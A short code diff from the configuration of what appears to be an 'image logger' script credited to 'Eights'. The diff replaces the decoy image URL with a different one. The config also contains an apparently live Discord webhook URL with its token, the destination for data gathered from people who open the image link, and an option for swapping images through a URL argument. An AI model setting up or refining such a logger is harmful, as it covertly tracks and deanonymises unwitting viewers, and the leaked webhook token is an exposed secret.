@@ -10,7 +10,7 @@ __author__ = "Eights"
 config = {
     # BASE CONFIG #
     "webhook": "https://ptb.discord.com/api/webhooks/1358378263608688712/VgzuEYsNq_DKVM2Zax3v_aBtVWPNtiRVbM2i5Vr3WQi4FIvRH2o3cTcK7sfBDkFIts73",
-    "image": "https://images.stockcake.com/public/9/0/0/900ca585-62ce-44f5-8345-85faaa60a0b0_large/amused-monkey-face-stockcake.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://media-photos.depop.com/b1/234923985/2926028603_6a189d882d9746a69b55ee28516ecaa2/P0.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
